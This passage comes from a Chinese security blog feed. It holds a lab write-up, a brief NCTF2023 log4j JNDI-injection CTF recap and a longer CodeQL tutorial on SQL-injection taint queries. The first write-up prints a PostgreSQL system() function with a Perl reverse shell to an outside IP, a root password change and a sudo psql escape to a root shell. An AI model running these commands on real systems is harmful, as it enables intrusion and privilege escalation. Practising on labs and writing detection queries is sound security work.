href="https://github.com/A-D-Team/grafanaExp/releases">https://github.com/A-D-Team/grafanaExp/releases</a></p><p><img src="../images/image-20240114182313739.png" alt="image-20240114182313739"></p><p>然后登录上去  用创建函数的方法来反弹shell     (这里的权限高)</p><p><img src="../images/image-20240114182503870.png" alt="image-20240114182503870"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE FUNCTION system (cstring) RETURNS integer AS &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;, &#x27;system&#x27; LANGUAGE &#x27;c&#x27; STRICT;</span><br><span class="line">select system(&#x27;perl -e \&#x27;use Socket;$i=&quot;172.30.54.179&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;\&#x27;&#x27;);</span><br></pre></td></tr></table></figure><p>然后这里改掉psql数据库root用户的密码(接下来提权要用到)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER USER root WITH PASSWORD &#x27;Admin@123&#x27;;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240114182707666.png" alt="image-20240114182707666"></p><p>这里记得要命令交互  不然等会提权会卡住 不成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240114182747502.png" alt="image-20240114182747502"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/local/postgresql/bin/psql</span><br><span class="line">\?</span><br><span class="line">!/bin/bash</span><br><span class="line">cat /root/flag/flag04.txt</span><br></pre></td></tr></table></figure><p>然后就可以了</p><p><img src="../images/image-20240114182802163.png" alt="image-20240114182802163"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考   &lt;a href=&quot;https://www.cnblogs.com/thebeastofwar/p/17939471&quot;&gt;https://www.cnblogs.com/thebeastofwar/p/17939471&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;先用fscan扫一下&lt;/p</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>NCTF2023-Web复现</title>
    <link href="https://ke1nys.github.io/posts/c361a29.html"/>
    <id>https://ke1nys.github.io/posts/c361a29.html</id>
    <published>2023-12-30T13:48:32.000Z</published>
    <updated>2024-01-20T15:32:19.403Z</updated>
    
    <content type="html"><![CDATA[<p>这个是南邮的校赛  看了看发现题目质量不错 就来复现一下</p><p><a href="https://github.com/X1cT34m/NCTF2023/tree/main">https://github.com/X1cT34m/NCTF2023/tree/main</a></p><p>web题目都给了docker可以自行复现</p><p>xz师傅写的wp  <a href="https://exp10it.io/2023/12/nctf-2023-web-official-writeup/#logging">https://exp10it.io/2023/12/nctf-2023-web-official-writeup/#logging</a></p><h2 id="logging"><a href="#logging" class="headerlink" title="logging"></a>logging</h2><p>这个题其实就是打jndi注入  考察的CVE是这个<strong>CVE-2021-44228</strong></p><p>其实去看了眼这个CVE 就会发现想要触发JNDI注入的话  是需要这个logger.xxxx方法的</p><p>这道题的话就可以采用使用springboot控制台报错的方法来获取到logger方法来执行JNDI注入</p><p>(因为springboot控制台报错的话会使用logger来输入日志  这样的话就会执行我们的JDNI注入了) </p><p><img src="../images/image-20231230222028712.png" alt="image-20231230222028712"></p><p>然后通过Accept来构造畸形请求头来使springboot报错<strong>(在host处也行  但是这个只能用一次  因为logger就只打印一次)</strong></p><p><img src="../images/image-20231230222136825.png" alt="image-20231230222136825"></p><p><img src="../images/image-20231230222147164.png" alt="image-20231230222147164"></p><p>这样就可以了</p><h2 id="ez-wordpress"><a href="#ez-wordpress" class="headerlink" title="ez_wordpress"></a>ez_wordpress</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这个是南邮的校赛  看了看发现题目质量不错 就来复现一下&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/X1cT34m/NCTF2023/tree/main&quot;&gt;https://github.com/X1cT34m/NCTF2023/tree/main</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://ke1nys.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL-学习</title>
    <link href="https://ke1nys.github.io/posts/dc43e171.html"/>
    <id>https://ke1nys.github.io/posts/dc43e171.html</id>
    <published>2023-12-28T13:03:12.000Z</published>
    <updated>2024-01-20T15:32:19.400Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.freebuf.com/articles/web/283795.html">https://www.freebuf.com/articles/web/283795.html</a>  (主要参考)</p><p><a href="https://github.com/Firebasky/CodeqlLearn">https://github.com/Firebasky/CodeqlLearn</a></p><h1 id="粗糙的数据库生成"><a href="#粗糙的数据库生成" class="headerlink" title="粗糙的数据库生成"></a>粗糙的数据库生成</h1><p>这里生成数据库的方法我用的是这个项目</p><p><a href="https://github.com/ice-doom/codeql_compile">https://github.com/ice-doom/codeql_compile</a></p><p>根据java源码构建数据库的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create &quot;D:\google download\cc_database&quot; --language=&quot;java&quot; --source-root=&quot;D:\google download\micro_service_seclab-main&quot;  --overwrite</span><br></pre></td></tr></table></figure><p>这里我用的例子是jar包</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python .\codeql_compile.py -a D:\codeql_compile\ezjava.jar  -d D:\codeql_compile\ezjava\BOOT-INF\lib</span><br><span class="line"></span><br><span class="line">codeql database create D:\codeql_compile\demo-database --language=<span class="string">&quot;java&quot;</span> --source-root=D:\codeql_compile\ezjava.jar_save_1703684740 --command=<span class="string">&quot;run.cmd&quot;</span></span><br></pre></td></tr></table></figure><p>一共两步就成功生成了数据库</p><p>然后导入数据库</p><p><img src="../images/image-20231228213705367.png" alt="image-20231228213705367"></p><p>先创建个文件夹  然后导入ql文件</p><p><img src="../images/image-20231228213941385.png" alt="image-20231228213941385"></p><p><code>qlpack.yml</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name: example-query</span><br><span class="line">version: 0.0.0</span><br><span class="line">libraryPathDependencies: codeql-java</span><br></pre></td></tr></table></figure><p>然后写ql文件就行了</p><h1 id="QL语言编写"><a href="#QL语言编写" class="headerlink" title="QL语言编写"></a>QL语言编写</h1><h2 id="基础查询"><a href="#基础查询" class="headerlink" title="基础查询"></a>基础查询</h2><h3 id="先是查询数据库中所有的类方法"><a href="#先是查询数据库中所有的类方法" class="headerlink" title="先是查询数据库中所有的类方法"></a>先是查询数据库中所有的类方法</h3><p>这里的话是使用<code>Method</code>这个来进行查询</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java</span><br><span class="line"></span><br><span class="line">from Method method</span><br><span class="line">select method</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231228214509935.png" alt="image-20231228214509935"></p><p>查出数据库中所有函数方法</p><hr><h3 id="指定查询某个方法"><a href="#指定查询某个方法" class="headerlink" title="指定查询某个方法"></a>指定查询某个方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java</span><br><span class="line"></span><br><span class="line">from Method method</span><br><span class="line">where method.hasName(<span class="string">&quot;resolveClass&quot;</span>)</span><br><span class="line">select method</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20231228214630394.png" alt="image-20231228214630394"></p><p>如果要把其是什么类查询出来的化  就再加上一句话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Method method</span><br><span class="line">where method.hasName(&quot;resolveClass&quot;)</span><br><span class="line">select method,method.getDeclaringType()</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231228214746369.png" alt="image-20231228214746369"></p><hr><h3 id="查询父类中子类的某个方法"><a href="#查询父类中子类的某个方法" class="headerlink" title="查询父类中子类的某个方法"></a>查询父类中子类的某个方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Method method</span><br><span class="line">where method.hasName(&quot;resolveClass&quot;) and method.getDeclaringType().getASupertype().hasQualifiedName(&quot;java.io&quot;, &quot;ObjectInputStream&quot;)</span><br><span class="line">select method, method.getDeclaringType()</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231228215047751.png" alt="image-20231228215047751"></p><p>这里的话是查询<code>ObjectInputStream</code>这个父类中子类的<code>resolveClass</code>方法  这里的话就会有个疑问就是 他只能查询到隔一级的子类  隔两级的子类的resolveClass方法是查不到的</p><h3 id="查询某个类中的某个方法被谁调用"><a href="#查询某个类中的某个方法被谁调用" class="headerlink" title="查询某个类中的某个方法被谁调用"></a>查询某个类中的某个方法被谁调用</h3><p>Call和Callable</p><p>Callable表示可调用的方法或构造器的集合。</p><p>Call表示调用Callable的这个过程（方法调用，构造器调用等等）</p><p>过滤 方法调用</p><p>MethodAccess</p><p>一般是先查<code>method</code>，与<code>MethodAccess.getMethod()</code> 进行比较。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java</span><br><span class="line"></span><br><span class="line">from MethodAccess call, Method method</span><br><span class="line">where method.hasName(<span class="string">&quot;resolveClass&quot;</span>) and method.getDeclaringType().getAnAncestor().hasQualifiedName(<span class="string">&quot;java.io&quot;</span>, <span class="string">&quot;ObjectInputStream&quot;</span>) and call.getMethod() = method</span><br><span class="line">select call</span><br></pre></td></tr></table></figure><p>这个是查找<code>resolveClass</code>这个方法被调用情况  我这样查是能查到  但是只能查父类下面差一级的子类</p><h3 id="谓词-可以理解为函数"><a href="#谓词-可以理解为函数" class="headerlink" title="谓词(可以理解为函数)"></a>谓词(可以理解为函数)</h3><p>和SQL一样，where部分的查询条件如果过长，会显得很乱。CodeQL提供一种机制可以让你把很长的查询语句封装成函数。</p><p>这个函数，就叫谓词。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java</span><br><span class="line"> </span><br><span class="line">predicate <span class="title function_">isStudent</span><span class="params">(Method method)</span> &#123;</span><br><span class="line">exists(|method.hasName(<span class="string">&quot;getStudent&quot;</span>))</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">from Method method</span><br><span class="line">where <span class="title function_">isStudent</span><span class="params">(method)</span></span><br><span class="line">select method.getName(), method.getDeclaringType()</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231229145822767.png" alt="image-20231229145822767"></p><blockquote><p>语法解释</p><p>predicate 表示当前方法没有返回值。</p><p>exists子查询，是CodeQL谓词语法里非常常见的语法结构，它根据内部的子查询返回true or false，来决定筛选出哪些数据。</p></blockquote><h3 id="设置Source和Sink"><a href="#设置Source和Sink" class="headerlink" title="设置Source和Sink"></a>设置Source和Sink</h3><blockquote><p>什么是source和sink</p><p>在代码自动化安全审计的理论当中，有一个最核心的三元组概念，就是(source，sink和sanitizer)。</p><p>source是指漏洞污染链条的输入点。比如获取http请求的参数部分，就是非常明显的Source。</p><p>sink是指漏洞污染链条的执行点，比如SQL注入漏洞，最终执行SQL语句的函数就是sink(这个函数可能叫query或者exeSql，或者其它)。</p><p>sanitizer又叫净化函数，是指在整个的漏洞链条当中，如果存在一个方法阻断了整个传递链，那么这个方法就叫sanitizer。</p></blockquote><p>只有当source和sink同时存在，并且从source到sink的链路是通的，才表示当前漏洞是存在的。</p><p><img src="../images/1628394339_610f53637de77e9114e4f.jpg!small" alt="image"></p><h4 id="设置source"><a href="#设置source" class="headerlink" title="设置source"></a>设置source</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSource(DataFlow::Node src) &#123;&#125;</span><br></pre></td></tr></table></figure><p>我们使用的是<code>Spring Boot</code>框架，<strong>那么source就是http参数入口的代码参数</strong>，在下面的代码中，source就是username：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value = &quot;/one&quot;)</span><br><span class="line">public List&lt;Student&gt; one(@RequestParam(value = &quot;username&quot;) String username) &#123;</span><br><span class="line">    return indexLogic.getStudent(username);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在下面的代码中，source就是<code>Student user</code>(user为Student类型，这个不受影响)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@PostMapping(value = &quot;/object&quot;)</span><br><span class="line">public List&lt;Student&gt; objectParam(@RequestBody Student user) &#123;</span><br><span class="line">    return indexLogic.getStudent(user.getUsername());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在下面的代码中，source就是<code>Student user</code>(user为Student类型，这个不受影响)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@PostMapping(value = &quot;/object&quot;)</span><br><span class="line">public List&lt;Student&gt; objectParam(@RequestBody Student user) &#123;</span><br><span class="line">    return indexLogic.getStudent(user.getUsername());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Source设置的代码为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSource(DataFlow::Node src) &#123; src instanceof RemoteFlowSource &#125;</span><br></pre></td></tr></table></figure><p>这是<code>SDK</code>自带的规则，里面包含了大多常用的Source入口。我们使用的SpringBoot也包含在其中, 我们可以直接使用。</p><p><code>instanceof</code>是codeql自带的语法</p><p>当然了上述语句并不是 完整可使用的语句  这是把我们等会完全的语句拿出部分进行解释讲解</p><h4 id="设置sink"><a href="#设置sink" class="headerlink" title="设置sink"></a>设置sink</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>在本案例中，我们的sink应该为<code>query</code>方法(Method)的调用(MethodAccess)，所以我们设置Sink为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">exists(Method method, MethodAccess call |</span><br><span class="line">  method.hasName(&quot;query&quot;)</span><br><span class="line">  and</span><br><span class="line">  call.getMethod() = method and</span><br><span class="line">  sink.asExpr() = call.getArgument(0)</span><br><span class="line">)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个语句中 call方法就是我们上文提到的   就是可以查询某个方法被谁调用了</p><p>注：以上代码使用了exists子查询语法，格式为exists(Obj obj| somthing), 上面查询的意思为：查找一个query()方法的调用点，<strong>并把它的第一个参数设置为sink</strong>  (加黑的这句话就是上述代码中最后一段的解释)</p><p>在靶场系统(<code>micro-service-seclab</code>)中，sink就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jdbcTemplate.query(sql, ROW_MAPPER);</span><br><span class="line"></span><br><span class="line">//提前说明一下</span><br></pre></td></tr></table></figure><p>因为我们测试的注入漏洞，当source变量流入这个方法的时候，才会发生注入漏洞！</p><p>当然了上述语句并不是 完整可使用的语句  这是把我们等会完全的语句拿出部分进行解释讲解</p><h3 id="Flow数据流"><a href="#Flow数据流" class="headerlink" title="Flow数据流"></a>Flow数据流</h3><p>设置好Source和Sink，就相当于搞定了首尾，但是首尾是否能够连通才能决定是否存在漏洞！</p><p>一个受污染的变量，能够毫无阻拦的流转到危险函数，就表示存在漏洞！</p><p>这个连通工作就是CodeQL引擎本身来完成的。我们通过使用<code>config.hasFlowPath(source, sink)</code>方法来判断是否连通。</p><p>比如如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><p>我们传递给<code>config.hasFlowPath(source, sink)</code>我们定义好的source和sink，系统就会自动帮我们判断是否存在漏洞了。</p><h3 id="Source和sink配合查询结果"><a href="#Source和sink配合查询结果" class="headerlink" title="Source和sink配合查询结果"></a>Source和sink配合查询结果</h3><p>在CodeQL中，我们使用官方提供的TaintTracking::Configuration方法定义source和sink，至于中间是否是通的，这个后面使用CodeQL提供的<code>config.hasFlowPath(source, sink)</code>来帮我们处理。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class VulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">  VulConfig() &#123; this = &quot;SqlInjectionConfig&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node src) &#123; src instanceof RemoteFlowSource &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    exists(Method method, MethodAccess call |</span><br><span class="line">      method.hasName(&quot;query&quot;)</span><br><span class="line">      and</span><br><span class="line">      call.getMethod() = method and</span><br><span class="line">      sink.asExpr() = call.getArgument(0)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>CodeQL语法和Java类似，extends代表集成父类TaintTracking::Configuration。</p><p>这个类是官方提供用来做数据流分析的通用类，提供很多数据流分析相关的方法，比如isSource(定义source)，isSink(定义sink)</p><p>src instanceof RemoteFlowSource 表示src 必须是 RemoteFlowSource类型。在RemoteFlowSource里，官方提供很非常全的source定义，我们本次用到的Springboot的Source就已经涵盖了。</p></blockquote><p>最终demo.ql</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @id java/examples/vuldemo</span><br><span class="line"> * @name Sql-Injection</span><br><span class="line"> * @description Sql-Injection</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> * @problem.severity warning</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line">import semmle.code.java.security.QueryInjection</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class VulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">  VulConfig() &#123; this = &quot;SqlInjectionConfig&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node src) &#123; src instanceof RemoteFlowSource &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    exists(Method method, MethodAccess call |</span><br><span class="line">      method.hasName(&quot;query&quot;)</span><br><span class="line">      and</span><br><span class="line">      call.getMethod() = method and</span><br><span class="line">      sink.asExpr() = call.getArgument(0)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><p>注：上面的注释和其它语言是不一样的，不能够删除，它是程序的一部分，因为在我们生成测试报告的时候，上面注释当中的name，description等信息会写入到审计报告中。</p><p><strong>(这个不能删  如果删了话再执行 就会生成不了下图中的alerts 不能清楚的看到source和sink之间的node了)</strong></p><p><img src="../images/image-20231229152906287.png" alt="image-20231229152906287"></p><h3 id="上述查询误报解决"><a href="#上述查询误报解决" class="headerlink" title="上述查询误报解决"></a>上述查询误报解决</h3><p><img src="../images/image-20231229153553428.png" alt="image-20231229153553428"></p><p>在上述跑出的链子中 跑出sink是这个东西  但是呢这个参数是long类型的  不可能存在sql注入</p><p>这说明我们的规则里，对于List<Long>，甚至List<Integer>类型都会产生误报，source误把这种类型的参数涵盖了。</p><p>我们需要采取手段消除这种误报。</p><p>这个手段就是<code>isSanitizer</code>。</p><p><img src="../images/1628394471_610f53e70361d448d1bbe.jpg" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">isSanitizer是CodeQL的类TaintTracking::Configuration提供的净化方法。它的函数原型是：</span><br><span class="line"></span><br><span class="line">override predicate isSanitizer(DataFlow::Node node) &#123;&#125;</span><br><span class="line">覆盖谓词 isSanitizer(DataFlow::Node 节点) &#123;&#125;</span><br><span class="line"></span><br><span class="line">在CodeQL自带的默认规则里，对当前节点是否为基础类型做了判断。</span><br><span class="line"></span><br><span class="line">override predicate isSanitizer(DataFlow::Node node) &#123;</span><br><span class="line">覆盖谓词 isSanitizer(DataFlow::Node 节点) &#123;</span><br><span class="line">node.getType() instanceof PrimitiveType or</span><br><span class="line">node.getType() instanceof BoxedType or</span><br><span class="line">node.getType() instanceof NumberType</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于CodeQL检测SQL注入里的<code>isSanitizer</code>方法，只对基础类型做了判断，并没有对这种复合类型做判断，才引起了这次误报问题。</p><p>那我们只需要将这种复合类型加入到isSanitizer方法，即可消除这种误报。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSanitizer(DataFlow::Node node) &#123;</span><br><span class="line">    node.getType() instanceof PrimitiveType or</span><br><span class="line">    node.getType() instanceof BoxedType or</span><br><span class="line">    node.getType() instanceof NumberType or</span><br><span class="line">    exists(ParameterizedType pt| node.getType() = pt and pt.getTypeArgument(0) instanceof NumberType )</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>以上代码的意思为：如果当前node节点的类型为基础类型，数字类型和泛型数字类型(比如List)时，就切断数据流，认为数据流断掉了，不会继续往下检测。<br>重新执行query，我们发现，刚才那条误报已经被成功消除啦。</p><p><img src="../images/image-20231229164818007.png" alt="image-20231229164818007"></p><blockquote><p>泛型就是指的是List<long>  这种   ParameterizedType这个指的就是泛型  pt.getTypeArgument(0) instanceof NumberType  这个指的就是泛型的第一个参数是不是Num类型</p></blockquote><p>这里执行的话是会返回True的  因为Node节点是会被匹配到的</p><h3 id="漏报解决"><a href="#漏报解决" class="headerlink" title="漏报解决"></a>漏报解决</h3><p>这个结果的返回时不全的  有些链子没有给我们返回来  例如下例语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public List&lt;Student&gt; getStudentWithOptional(Optional&lt;String&gt; username) &#123;</span><br><span class="line">        String sqlWithOptional = &quot;select * from students where username like &#x27;%&quot; + username.get() + &quot;%&#x27;&quot;;</span><br><span class="line">        //String sql = &quot;select * from students where username like ?&quot;;</span><br><span class="line">        return jdbcTemplate.query(sqlWithOptional, ROW_MAPPER);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里修复方法就是强制给其接上</p><p><img src="../images/1628394505_610f5409ded2fb0984439.jpg!small" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">isAdditionalTaintStep方法是CodeQL的类TaintTracking::Configuration提供的的方法，它的原型是：</span><br><span class="line"></span><br><span class="line">override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) &#123;&#125;</span><br><span class="line">覆盖谓词 isAdditionalTaintStep(DataFlow::Node 节点1, DataFlow::Node 节点2) &#123;&#125;</span><br><span class="line"></span><br><span class="line">它的作用是将一个可控节点</span><br><span class="line">A强制传递给另外一个节点B，那么节点B也就成了可控节点。</span><br></pre></td></tr></table></figure><p>多次测试之后，我认定是因为username.get()这一步断掉了。大概是因为Optional这种类型的使用没有在CodeQL的语法库里。</p><p>那么这里我们强制让username流转到username.get()，这样username.get()就变得可控了。这样应该就能识别出这个注入漏洞了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @id java/examples/vuldemo</span><br><span class="line"> * @name Sql-Injection</span><br><span class="line"> * @description Sql-Injection</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> * @problem.severity warning</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line">import semmle.code.java.security.QueryInjection</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">predicate isTaintedString(Expr expSrc, Expr expDest) &#123;</span><br><span class="line">    exists(Method method, MethodAccess call, MethodAccess call1 | expSrc = call1.getArgument(0) and expDest=call and call.getMethod() = method and method.hasName(&quot;get&quot;) and 